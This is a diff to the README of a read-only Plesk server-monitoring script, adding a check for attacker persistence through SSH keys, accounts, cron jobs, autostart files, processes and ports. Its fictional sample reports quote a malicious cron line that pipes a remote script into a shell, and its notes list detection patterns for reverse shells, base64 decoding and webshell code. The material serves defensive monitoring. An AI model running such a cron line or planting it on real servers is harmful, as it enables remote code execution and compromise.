@@ -64,6 +64,7 @@ Just as useful: the reports confirmed what is *fine*. Reverse DNS, HELO name and
 | **Reputation** | server IP against Spamhaus, SpamCop, Barracuda, PSBL; remote rejections mentioning blocklists, reputation, spam or rate limits (including the wording of Gmail, Microsoft, Apple iCloud, Yahoo, GMX/web.de and T-Online, e.g. "likely unsolicited", "unusual rate", "local policy" [CS01]/[HM08], "excessive volume", "policy restrictions", DMARC rejections), with examples; mails the spam filter skipped because of their size; **outgoing deliveries per provider** (sent / deferred / bounced for Microsoft, Google, Apple, GMX/web.de/IONOS, T-Online, …) and **watched recipient domains** | the server IP is listed, recipients reject or throttle mail because of reputation, or a delivery to a watched domain fails |
 | **Brute force** | failed SMTP/IMAP/POP3 logins, most attacked mailboxes, fail2ban jails | failures spike, or a jail bans an IP that logged in successfully before (a customer's device with an outdated password) |
 | **Intrusion** | successful SSH and Plesk panel logins, **new PHP files in `wp-content/uploads`**, **successful WordPress logins during a brute-force attack** | a login comes from a never-seen IP, a PHP file appears in an upload folder, or an IP logs in to WordPress after repeated failures |
+| **Access & persistence** | what an attacker leaves behind: **SSH keys** in every account's `authorized_keys`, accounts with a login shell or UID 0, members of `sudo`/`wheel`/`admin`, sudoers files, `/etc/ld.so.preload`, **cron jobs** (customer crontabs, root, `/etc/cron.*`) and autostart files (`rc.local`, systemd units in `/etc`), **processes** running from `/tmp`, `/dev/shm` or a web folder, from a deleted file or from memory only, or posing as a kernel thread, **listening TCP ports** | a key, account, sudo right or port is new or changed, a cron job or autostart file contains a download piped into a shell, base64 decoding, a reverse shell or a program in `/tmp`, root or the system gets a new cron entry, or a suspicious process runs. Compared with the previous run, read only |
 | **Geolocation** (optional) | country and network operator of every IP with a successful login (mailboxes, SSH, Plesk panel, WordPress) and of the top failed-login IPs, datacenter networks marked, from a **local** database, so no IP leaves the server | a mailbox sends mail, is read via IMAP/POP3, or someone logs in, from a country outside `ALLOWED_COUNTRIES` |
 | **System** | load, CPU per system user (= subscription), RAM, disks, failed systemd units, OOM killer | thresholds are exceeded |
 | **Backups** | time, age and status of the latest **Plesk backup** (errors from its `backup.log`), Acronis agent (if installed) | the latest backup is older than `WARN_BACKUP_HOURS` or finished with errors, or the Acronis agent is not running |
@@ -81,7 +82,7 @@ Just as useful: the reports confirmed what is *fine*. Reverse DNS, HELO name and
 
 ```
 Server report host.example.com – 2026-10-26 10:05 UTC – plesk-server-report v1.5.0
-STATUS: WARNING (12)
+STATUS: WARNING (13)
  ! Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
  ! Mail: mailbox info@shop.example submitted 140 mails after logins from outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter]) 203.0.113.99 (VN, Example Telecom) – password compromised?
  ! Mail: mailbox info@shop.example used from 12 different IPs – password compromised?
@@ -92,6 +93,7 @@ STATUS: WARNING (12)
  ! Web: blog.example logged 48 PHP fatal errors
  ! Web: shop.example served the sensitive file /.env (HTTP 200, file exists) – remove it or block access; assume it was downloaded
  ! Web: 2 new PHP file(s) in wp-content/uploads – possible malware
+ ! Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
  ! Updates: 3 security update(s) pending
  ! Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access
 
@@ -227,6 +229,14 @@ New since last run: 2
      1× Plesk -              from 198.51.100.200   (panel, user not logged)  DE, Example Telekom AG
   Plesk panel: 7 failed login attempt(s) (fail2ban jail plesk-panel)
 
+== ACCESS & PERSISTENCE (SSH keys, accounts, sudo, cron, autostart, processes, ports) ==
+SSH keys (authorized_keys): 2 key(s) of 1 account(s)
+Accounts with a login shell: 2 | sudo group members: 1 | sudoers files: 1
+Cron jobs: 38 entr(y/ies) | autostart files (cron.hourly…monthly, rc.local, systemd units in /etc): 17
+  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
+Processes: 284 checked, 0 suspicious (program in /tmp, /dev/shm or a web folder, deleted, memory only, fake kernel thread)
+Listening TCP ports (not loopback): 21 xinetd, 22 sshd, 25 master, 53 named, 80 nginx, 110 couriertcpd, 143 couriertcpd, 443 nginx, 465 master, 587 master, 993 couriertcpd, 995 couriertcpd, 8443 sw-cp-serverd, 8880 sw-cp-serverd
+
 == SERVICES ==
 Failed units: none
 OOM killer: none
@@ -286,7 +296,7 @@ Mail authentication (SPF / DKIM / DMARC):
 IP geolocation: DB-IP.com Lite databases (CC BY 4.0)
 ```
 
-The report above is what a hijacked mailbox and a hacked WordPress site look like: one mailbox, read via IMAP from a Brazilian datacenter for the first time and used from twelve different IPs, suddenly sends 140 mails to 700 recipients pretending to be a bank. Gmail, Microsoft and Apple start throttling and rejecting the server's mail – for every customer on it. Two PHP files show up in the uploads folder of the same customer, and that site's `.env` file with its database password can be downloaded by anyone. The second IMAP line (Spain) raises no alert: that mailbox has been seen there before, someone on holiday.
+The report above is what a hijacked mailbox and a hacked WordPress site look like: one mailbox, read via IMAP from a Brazilian datacenter for the first time and used from twelve different IPs, suddenly sends 140 mails to 700 recipients pretending to be a bank. Gmail, Microsoft and Apple start throttling and rejecting the server's mail – for every customer on it. Two PHP files show up in the uploads folder of the same customer, a new cron job of that site downloads and runs a script every ten minutes – deleting the PHP files alone would not stop it – and that site's `.env` file with its database password can be downloaded by anyone. The second IMAP line (Spain) raises no alert: that mailbox has been seen there before, someone on holiday.
 
 <details>
 <summary><b>Example <code>summary.txt</code></b> (the same day, condensed from all reports of the last 24 hours – 24 with the hourly cron job, 12 if it runs every 2 hours; fictional data, shortened)</summary>
@@ -303,7 +313,7 @@ Built from the reports of this period. Daily checks and fail2ban: see latest.txt
   2026-10-26 01:05 UTC  STATUS: WARNING (2)
   …
   2026-10-26 09:05 UTC  STATUS: WARNING (5)
-  2026-10-26 10:05 UTC  STATUS: WARNING (12)
+  2026-10-26 10:05 UTC  STATUS: WARNING (13)
 
 == ALERTS (times seen, first – last, text) ==
    10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Updates: 3 security update(s) pending
@@ -367,6 +377,9 @@ New in this period: 2
 == SUCCESSFUL LOGINS (SSH, Plesk panel; count, first – last) ==
      9×  2026-10-25 14:05 UTC – 2026-10-26 10:05 UTC  SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
      2×  2026-10-26 08:05 UTC – 2026-10-26 10:05 UTC  Plesk -              from 198.51.100.200   (panel, user not logged)  DE, Example Telekom AG
+
+== ACCESS & PERSISTENCE (changes + − ~ and findings !; count, first – last) ==
+     1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
 ```
 
 The summary shows what a single report can't: the first signs at 09:05 (the first IMAP login from Brazil, five IPs, 23 mails with a foreign sender), the escalation an hour later with the big providers throttling the server, and that the exposed `.env` had been reported since the daily check at 01:05.
@@ -578,12 +591,12 @@ Every run uploads three kinds of files:
 |---|---|
 | `report-YYYYMMDD-HHMM.txt` | the full report of one run (time in the server's time zone, usually UTC) |
 | `latest.txt` | a copy of the newest report, including the daily checks and fail2ban |
-| `summary.txt` | all reports of the last 24 hours condensed into one file: every run with its status (gaps are easy to spot), every alert with how often and when it was seen, mail and web totals, deliveries per provider, peaks of load and RAM, the backup status of the newest report, and every line of the sections that are normally empty (successful logins, IMAP/POP3 logins from other countries, new PHP files in uploads, login ≠ from, webmail, WordPress attacks, traffic peaks, files served with 200) |
+| `summary.txt` | all reports of the last 24 hours condensed into one file: every run with its status (gaps are easy to spot), every alert with how often and when it was seen, mail and web totals, deliveries per provider, peaks of load and RAM, the backup status of the newest report, and every line of the sections that are normally empty (successful logins, changes of SSH keys, accounts, cron jobs and ports, suspicious processes, IMAP/POP3 logins from other countries, new PHP files in uploads, login ≠ from, webmail, WordPress attacks, traffic peaks, files served with 200) |
 
 - **Yourself:** open `latest.txt`. The first lines tell you everything: `STATUS: OK` or `STATUS: WARNING (n)` followed by the list of alerts (` ! `) and, if any, notes about missing data (` i `, e.g. a log file that was not found – the figures of that section are then 0, not "all clear"). `summary.txt` shows what happened during the day.
 - **With an AI assistant (this is how the author uses it, with Claude):** connect an assistant that supports your storage (e.g. a Google Drive or OneDrive connector) **to the dedicated account** and let it review the day every morning as a scheduled task. Reading `summary.txt` and `latest.txt` instead of every single report keeps the review fast and cheap (two files instead of 24), without losing anything: the summary is built from the reports and keeps every alert. Tell the assistant what is normal on your server (known broken sites, mail-only domains, …) so it only reports real changes. Example prompt:
 
-  > In the folder `server-reports/<hostname>`, search for the files `summary.txt` and `latest.txt` by name – don't list the whole folder. Read both. `summary.txt` condenses all reports of the last 24 hours (runs with status, every alert with count and first/last time, totals, every successful login); `latest.txt` is the newest full report with the daily checks and fail2ban. If `summary.txt` is missing or its newest run is more than 2 hours old, report that as an issue. Check the run list for gaps (more than 2 hours between runs). (Both limits assume the hourly cron job – if it runs every N hours, use N + 1 hours.) Alerts starting with "Script:" and the section SCRIPT NOTES mean the report itself is incomplete (a run aborted or still hanging, a command timed out, a log file not found) – report them too. Only if an alert needs more detail, read the single report of that time (`report-YYYYMMDD-HHMM.txt`). Summarise: outgoing spam signals, blocklist listings and rejections by the big mail providers, deliveries to watched recipient domains, mailbox logins from new countries (a login that read no mail is less likely an attack than one that downloaded the mailbox), customers banned by fail2ban (alert starting with "fail2ban:" – include the unban command), new PHP files in uploads, logins from unknown IPs, failed services, 5xx/PHP errors, pending security updates, a newer script version (mention once), expiring certificates, mail authentication, exposed files, backup status. Lines marked as a recommendation (e.g. missing HSTS) are not an issue – mention them once at the end. Start with "All OK" or "Action required: …", max. 10 bullet points with a concrete next step. Read only, change nothing.
+  > In the folder `server-reports/<hostname>`, search for the files `summary.txt` and `latest.txt` by name – don't list the whole folder. Read both. `summary.txt` condenses all reports of the last 24 hours (runs with status, every alert with count and first/last time, totals, every successful login); `latest.txt` is the newest full report with the daily checks and fail2ban. If `summary.txt` is missing or its newest run is more than 2 hours old, report that as an issue. Check the run list for gaps (more than 2 hours between runs). (Both limits assume the hourly cron job – if it runs every N hours, use N + 1 hours.) Alerts starting with "Script:" and the section SCRIPT NOTES mean the report itself is incomplete (a run aborted or still hanging, a command timed out, a log file not found) – report them too. Only if an alert needs more detail, read the single report of that time (`report-YYYYMMDD-HHMM.txt`). Summarise: outgoing spam signals, blocklist listings and rejections by the big mail providers, deliveries to watched recipient domains, mailbox logins from new countries (a login that read no mail is less likely an attack than one that downloaded the mailbox), customers banned by fail2ban (alert starting with "fail2ban:" – include the unban command), new PHP files in uploads, logins from unknown IPs, new SSH keys, accounts, cron jobs, processes or ports (alerts starting with "Access:", "Cron:", "Process:", "Ports:"), failed services, 5xx/PHP errors, pending security updates, a newer script version (mention once), expiring certificates, mail authentication, exposed files, backup status. Lines marked as a recommendation (e.g. missing HSTS) are not an issue – mention them once at the end. Start with "All OK" or "Action required: …", max. 10 bullet points with a concrete next step. Read only, change nothing.
 
 - A daily review **does not replace real-time alerting**. For "server down" use an uptime monitor (e.g. Plesk 360 Monitoring, Uptime Kuma), and set **outgoing mail limits** in Plesk (*Tools & Settings → Outgoing Mail Control*) so a hijacked mailbox is throttled immediately.
 
@@ -591,7 +604,7 @@ Every run uploads three kinds of files:
 
 ## What the script remembers
 
-Between runs the script keeps its memory in `/var/lib/plesk-server-report`: where it stopped reading each log, known login IPs, countries per mailbox, the local reports. You never have to touch it – but if you wonder why an alert did not come, or want the script to forget a known IP, [STATE-FILES.md](STATE-FILES.md) describes every file (the same text is kept as `README.txt` in that folder), and `plesk-server-report.sh --show-state` prints what is stored in readable form.
+Between runs the script keeps its memory in `/var/lib/plesk-server-report`: where it stopped reading each log, known login IPs, countries per mailbox, the baseline of SSH keys, accounts, cron jobs and ports, the local reports. You never have to touch it – but if you wonder why an alert did not come, or want the script to forget a known IP, [STATE-FILES.md](STATE-FILES.md) describes every file (the same text is kept as `README.txt` in that folder), and `plesk-server-report.sh --show-state` prints what is stored in readable form.
 
 ---
 
@@ -658,6 +671,8 @@ All thresholds apply **per run**. With the hourly cron job that means per hour; 
 | `EXPOSED_FILES_CHECK` / `EXPOSED_FILES_IGNORE` | 1 / SQL files shipped with software | daily scan of the document roots for exposed files. The ignore regex skips schema/upgrade `.sql` files bundled with WordPress plugins, osTicket and phpBB by default. Extend it, don't replace it, unless you want those back |
 | `WEBSHELL_CHECK` / `WEBSHELL_IGNORE` | 1 / empty | daily scan of recently changed PHP files for backdoor code, regex of paths to ignore |
 | `WEBSHELL_FIRST_DAYS` | 7 | the first scan covers PHP files changed within this many days; later scans cover files changed since the previous scan |
+| `PERSISTENCE_CHECK` | 1 | hourly check of SSH keys, accounts, sudo, cron jobs, autostart files, suspicious processes and listening ports (see [Notes](#notes-and-limitations)), 0 = off |
+| `PERSISTENCE_IGNORE` | empty | regex on the text of findings of that check to leave out, e.g. `'/tmp/known-tool'` for a tool you run from `/tmp` on purpose |
 | `WARN_CERT_DAYS` | 14 | certificate expiry warning |
 | `WARN_BACKUP_HOURS` | 26 | maximum age of the last Plesk backup |
 | `REMOTE` | `reports:server-reports/<host>` | rclone `remote:path` for the upload, `""` = keep reports locally only |
@@ -689,6 +704,7 @@ All thresholds apply **per run**. With the hourly cron job that means per hour; 
 - **PHP files in `wp-content/uploads`:** the first run lists all existing ones. Some plugins legitimately store PHP files there (Borlabs Cookie and Mailchimp for WP are excluded by default). Add your own to `UPLOADS_PHP_IGNORE`. Anything else deserves a look: this is the classic place for web shells.
 - **IMAP/POP3 countries:** mailboxes already read from abroad at the first run are stored as known (`known_imap_countries`) without an alert.
 - **Logins:** all IPs with a successful SSH/panel login in the current logs are stored as known (`/var/lib/plesk-server-report/known_login_ips`). Every later login from a new IP raises an alert once. Remove lines from that file to "forget" an IP.
+- **SSH keys, accounts, sudo, cron jobs, autostart files, listening ports:** the first run stores what is there as the baseline (`/var/lib/plesk-server-report/baseline/`) without alerts – except cron jobs and autostart files with suspicious content and suspicious processes, which are reported right away. From then on every change is listed once.
 - **To repeat the daily checks today:** `rm /var/lib/plesk-server-report/daily_date`
 - **To run single checks right now**, e.g. after fixing a DNS record: `plesk-server-report.sh --only mailauth` (several: `--only mailauth,domaindns`; groups: `hourly`, `daily`, `all`; names: `--list`). The result is printed and nothing else happens: no upload, and log offsets, scan stamps and known login IPs stay as they are, so the next hourly run still sees everything. The on/off switches from the configuration (`MAILAUTH_CHECK` etc.) don't apply to checks named explicitly.
 - **For a complete reset:** `rm -rf /var/lib/plesk-server-report`
@@ -719,6 +735,12 @@ All thresholds apply **per run**. With the hourly cron job that means per hour; 
 - **Country alerts and mail apps:** some apps connect to your mail server **from their provider's cloud**, not from the user's device. The Outlook app (iOS/Android) for IMAP accounts uses Microsoft servers, Gmail's "send mail as" uses Google servers, both often outside your country. Those logins show up as `[datacenter]` in another country. If your customers use such apps, add the operator to `GEO_TRUSTED_ORGS`, accepting that attackers on that cloud are then not flagged by country (the IP count and login ≠ from checks still apply). Geolocation is an additional signal, not proof: attackers can use VPNs in your country.
 - **Attack patterns** are counted from the request URL only (method, path, query string), not from POST bodies. A count answered with `200` doesn't mean the attack worked: many applications answer every URL with 200. Treat it as a pointer. The ModSecurity section (Plesk's web application firewall, read from each domain's `error_log`) shows what was actually blocked.
 - **Sensitive files:** a probe answered with 200 raises an alert only if the requested file **exists in the document root** (document roots are read from the Plesk database). Otherwise it is listed as "200 without such file", which is typical for catch-all routes. The daily document-root scan finds such files before anyone requests them, and asks the web server whether each one is actually reachable from outside (`HTTP 200`) or blocked. Reachable files are listed one by one and raise an alert. Blocked ones are summarized per domain: they are no leak, but old backups in particular are worth cleaning up.
+- **Access & persistence:** after a break-in, attackers make sure they can come back – an SSH key, a new account, a cron job that reinstalls the malware every few minutes, a process mining crypto currency. The script compares these every run with the previous run (`baseline/` in the state directory) and lists each change once. It only reads: nothing is deleted, blocked or stopped.
+  - *Alerts* come for a new or changed SSH key, account with a login shell, sudo right, sudoers file or `/etc/ld.so.preload`, for an account other than root with UID 0, for a new listening TCP port, for a new cron entry of root or the system (`/etc/crontab`, a new file in `/etc/cron.d`) and a new autostart file, and for any cron job or autostart file with suspicious content: a download piped into a shell (`curl … | sh`), `base64 -d`, `/dev/tcp/` (reverse shell), a program in `/tmp`, `/var/tmp` or `/dev/shm`, interpreter one-liners (`python -c`, `perl -e`), `nc -e`, known miner names. Writing a log to `/tmp` (`> /tmp/x.log`) doesn't count. When you change something yourself (Plesk "Scheduled Tasks", a new SSH key, `apt` installing a package with a cron file), you get one alert, and that's it.
+  - *Listed without alert:* new cron jobs of customers (subscriptions), changed autostart files (package updates), and everything removed.
+  - *Processes* are checked live in every run, without a baseline: a program in `/tmp`, `/var/tmp`, `/dev/shm` or under `/var/www`, a program deleted after it was started (unless an update replaced it – then only a restart is pending), a program that exists only in memory (`memfd`, not for root), and a process whose name looks like a kernel thread (`[kworker/0:1]`) but that has a program file. The alert repeats in every run while the process runs; a monitoring or security agent that uses such tricks on purpose can be excluded with `PERSISTENCE_IGNORE`. In containers without access to `/proc/<pid>/exe` this part is skipped, with a line in the report.
+  - *Passwords in cron lines* (`mysqldump -pSecret`, `https://user:pw@…`, `password=…`) are masked in the report and in the baseline.
+  - *Not covered:* keys in an `AuthorizedKeysFile` other than `~/.ssh/authorized_keys`, UDP ports, `at` jobs, and anything an attacker with root rights hides on purpose (a rootkit can hide processes and files from every tool on the system – the checks catch the common, automated attacks on web servers, not a targeted one).
 - **Webshell scan:** only PHP files changed since the previous scan are checked, so a full plugin update can produce a burst of findings. Legitimate plugins rarely use these constructs (`eval(base64_decode(`, `assert($_POST`, calling functions from request parameters, `preg_replace` with `/e`). Check each finding and exclude known-good files with `WEBSHELL_IGNORE`.
 - **Mail certificate name:** if your customers enter something other than the server's host name in their mail clients (e.g. `mail.example.com`), set `MAIL_TLS_NAME` to that name. A name mismatch shows up in clients as a certificate warning, and many users click it away.
 - **Domain DNS:** "website points elsewhere" is informational: a domain moved to another host, or sits behind a CDN such as Cloudflare. The CAA check only runs for domains whose current certificate comes from Let's Encrypt. Domain blocklists (Spamhaus DBL, SURBL) refuse queries from large public resolvers, just like the IP blocklists, so they are queried through the local resolver.
@@ -733,7 +755,7 @@ All thresholds apply **per run**. With the hourly cron job that means per hour; 
 
 ## Security
 
-- Runs as root because it needs to read all logs. It writes only to `/var/lib/plesk-server-report` (mode 700), to the configured rclone remote and – with `REPORT_MAIL_TO` – hands mails to the local `sendmail`.
+- Runs as root because it needs to read all logs (and `/proc`, crontabs, `authorized_keys` for the persistence check). It changes nothing on the server – no IP is blocked, no process stopped, no file removed; findings are reported, the action is yours. It writes only to `/var/lib/plesk-server-report` (mode 700), to the configured rclone remote and – with `REPORT_MAIL_TO` – hands mails to the local `sendmail`.
 - External connections: DNS lookups (blocklists, SPF/DKIM, domain DNS), the rclone upload, the report mails (only if `REPORT_MAIL_TO` is at another provider), the daily HTTPS check of your own domains (to this server's IP), the monthly download of the DB-IP Lite database (only with geolocation), and once a day one request to the GitHub API for the latest release of the script (`UPDATE_CHECK=0` switches it off). Nothing about your server is sent; the script never updates itself.
 - The rclone config (`/root/.config/rclone/rclone.conf`) contains the token for the storage account. That is another reason to use a dedicated account with the narrowest possible scope (`drive.file`, bucket-limited keys, chrooted SFTP user).
 
